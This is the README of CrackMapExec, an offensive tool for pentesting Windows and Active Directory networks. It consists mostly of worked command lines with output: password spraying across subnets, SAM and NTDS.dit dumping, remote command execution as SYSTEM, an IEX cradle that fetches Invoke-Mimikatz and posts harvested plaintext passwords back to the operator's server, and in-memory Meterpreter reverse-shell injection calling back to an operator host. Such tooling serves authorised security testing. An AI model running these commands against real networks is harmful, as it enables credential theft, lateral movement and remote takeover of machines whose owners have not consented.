# CrackMapExec
A swiss army knife for pentesting Windows/Active Directory environments

Powered by [Impacket](https://github.com/CoreSecurity/impacket)

This project was inspired by/based off of:
- @agsolino's [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py), [wmiquery.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiquery.py), [smbexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbexec.py), [samrdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/samrdump.py), [secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py), [atexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/atexec.py) and [lookupsid.py](https://github.com/CoreSecurity/impacket/blob/master/examples/lookupsid.py) scripts (beyond awesome)
- @ShawnDEvans's [smbmap](https://github.com/ShawnDEvans/smbmap)
- @gojhonny's [CredCrack](https://github.com/gojhonny/CredCrack)
- @pentestgeek's [smbexec](https://github.com/pentestgeek/smbexec)

Additionally some code was stolen from @T-S-A's [smbspider](https://github.com/T-S-A/smbspider) script

This repo also includes [Invoke-Mimikatz.ps1](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1), [Invoke-NinjaCopy.ps1](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), [Invoke-ReflectivePEInjection.ps1](https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) and [Invoke-Shellcode.ps1](https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke--Shellcode.ps1) scripts from @mattifestation's [PowerSploit](https://github.com/mattifestation/PowerSploit) project 

#Description

CrackMapExec is your one-stop-shop for pentesting Windows/Active Directory environments!

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell, dumping the NTDS.dit and more!

The biggest improvements over the above tools are:
- Pure Python script, no external tools required
- Fully concurrent threading
- Uses **ONLY** native WinAPI calls for discovering sessions, users, dumping SAM hashes etc...
- Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc...)

#Installation on Kali Linux

Run ```pip install --upgrade -r requirements.txt```

#Usage
```
  ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______ 
 /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
|  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
|  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |     
|  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
 \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r

                      Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)

                                                  Inspired by:
                           @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
                           @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
                           @pentestgeek's smbexec https://github.com/pentestgeek/smbexec

positional arguments:
  target                The target range, CIDR identifier or file containing targets

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            Set how many concurrent threads to use
  -u USERNAME           Username(s) or file containing usernames
  -p PASSWORD           Password(s) or file containing passwords
  -H HASH               NTLM hash(es) or file containing NTLM hashes
  -C COMBO_FILE         Combo file containing a list of domain\username:password or username:password entries
  -d DOMAIN             Domain name
  -n NAMESPACE          WMI Namespace (default //./root/cimv2)
  -s SHARE              Specify a share (default: C$)
  --port {139,445}      SMB port (default: 445)
  -v                    Enable verbose output

Credential Gathering:
  Options for gathering credentials

  --sam                 Dump SAM hashes from target systems
  --mimikatz            Run Invoke-Mimikatz (sekurlsa::logonpasswords) on target systems
  --mimikatz-cmd MIMIKATZ_CMD
                        Run Invoke-Mimikatz with the specified command
  --ntds {ninja,vss,drsuapi}
                        Dump the NTDS.dit from target DCs using the specifed method
                        (drsuapi is the fastest)

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              List shares
  --check-uac           Checks UAC status
  --sessions            Enumerate active sessions
  --disks               Enumerate disks
  --users               Enumerate users
  --rid-brute MAX_RID   Enumerate users by bruteforcing RID's
  --pass-pol            Dump password policy
  --lusers              Enumerate logged on users
  --wmi QUERY           Issues the specified WMI query

Spidering:
  Options for spidering shares

  --spider FOLDER       Folder to spider (defaults to share root dir)
  --pattern PATTERN     Pattern to search for in filenames and folders
  --patternfile PATTERNFILE
                        File containing patterns to search for
  --depth DEPTH         Spider recursion depth (default: 1)

Command Execution:
  Options for executing commands

  --execm {atexec,wmi,smbexec}
                        Method to execute the command (default: smbexec)
  --force-ps32          Force all PowerShell code/commands to run in a 32bit process
  -x COMMAND            Execute the specified command
  -X PS_COMMAND         Excute the specified powershell command

Shellcode/EXE/DLL/Meterpreter Injection:
  Options for injecting Shellcode/EXE/DLL/Meterpreter in memory using PowerShell

  --inject {met_reverse_http,met_reverse_https,exe,shellcode,dll}
                        Inject Shellcode, EXE, DLL or Meterpreter
  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems (ignored if injecting Meterpreter)
  --procid PROCID       Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)
  --exeargs EXEARGS     Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)
  --met-options LHOST LPORT
                        Meterpreter options (ignored if not injecting Meterpreter)

Filesystem Interaction:
  Options for interacting with filesystems

  --list PATH           List contents of a directory
  --download PATH       Download a file from the remote systems
  --upload SRC DST      Upload a file to the remote systems
  --delete PATH         Delete a remote file

There's been an awakening... have you felt it?

```

#Examples

The most basic usage: scans the subnet using 100 concurrent threads:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
```

Quick credential validation:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
```

Specify multiple user/pass combinations from the command line or a file:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username1,username2 -p password1,password2
[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
[+] 192.168.2.5:445 Login successful 'HRBOX\username1:password2'
[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
[+] 192.168.2.6:445 Login successful 'DESKTOP-QDVNP6B\username1:password2'
```

Let's enumerate available shares:
```
#~  python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --shares
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Available shares:
	SHARE			Permissions
	-----			-----------
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Available shares:
	SHARE			Permissions
	-----			-----------
	Users			READ, WRITE
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
[+] 172.16.206.132:445 DRUGCOMPANY-PC Available shares:
	SHARE			Permissions
	-----			-----------
	Users			READ, WRITE
	ADMIN$			READ, WRITE
	IPC$			NO ACCESS
	C$			    READ, WRITE
```

Let's execute some commands on all systems concurrently:

```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password -x whoami
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
nt authority\system

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
nt authority\system

[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
nt authority\system
```

Same as above only using WMI as the code execution method:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --execm wmi -x whoami
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via WMI
drugcompany-pc\administrator

[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via WMI
drugoutcove-pc\administrator

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via WMI
desktop-qdvnp6b\drugdealer
```

Use an IEX cradle to run ```Invoke-Mimikatz.ps1``` on all systems concurrently (PS script gets hosted automatically with an HTTP server),
Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file and parsed for clear-text credentials:
```
#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
[*] Press CTRL-C at any time to exit
[*] Note: This might take some time on large networks! Go grab a redbull!

[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
172.16.206.130 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.132 - - [19/Aug/2015 18:57:41] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:45] "POST / HTTP/1.1" 200 -
[+] 172.16.206.133 Found plain text creds! Domain: drugoutcove-pc Username: drugdealer Password: IloveMETH!@$
[*] 172.16.206.133 Saved POST data to Mimikatz-172.16.206.133-2015-08-19_18:57:45.log
172.16.206.130 - - [19/Aug/2015 18:57:47] "POST / HTTP/1.1" 200 -
[*] 172.16.206.130 Saved POST data to Mimikatz-172.16.206.130-2015-08-19_18:57:47.log
172.16.206.132 - - [19/Aug/2015 18:57:48] "POST / HTTP/1.1" 200 -
[+] 172.16.206.132 Found plain text creds! Domain: drugcompany-PC Username: drugcompany Password: IloveWEED!@#
[+] 172.16.206.132 Found plain text creds! Domain: DRUGCOMPANY-PC Username: drugdealer Password: D0ntDoDrugsKIDS!@#
[*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
``` 

Lets spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
```
#~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
[+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Started spidering
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Started spidering
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecrepasswords.lnk
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecretpasswords.lnk
//172.16.206.132/Users/drugcompany/Desktop/supersecretpasswords.txt
[+] 172.16.206.132:445 DRUGCOMPANY-PC Done spidering (Completed in 7.0349509716)
//172.16.206.133/Users/drugdealerboss/Documents/omgallthepasswords.txt
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Done spidering (Completed in 16.2127850056)
//172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
//172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
```

Directly inject Meterpreter into memory forcing the Powershell code to run in a 32bit process
```
#~ python crackmapexec.py -t 100 192.168.2.5-6 -u username -p password --force-ps32 --inject met_reverse_https --met-options 192.168.2.1 4545

[*] Press CTRL-C at any time to exit
[*] Note: This might take some time on large networks! Go grab a redbull!

[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:HRBOX) (domain:HRBOX)
[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:AVERAGEJOEBOX) (domain:AVERAGEJOEBOX)
[+] 192.168.2.5:445 Login successful 'HRBOX\username:password'
[+] 192.168.2.6:445 Login successful 'AVERAGEJOEBOX\username:password'
192.168.2.6 - - [08/Oct/2015 12:50:56] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
192.168.2.5 - - [08/Oct/2015 12:50:58] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
```

#To do
- Kerberos support
- ~~Execute custom commands with mimikatz~~
- Modularize the script (??)
- Anything that could be useful!
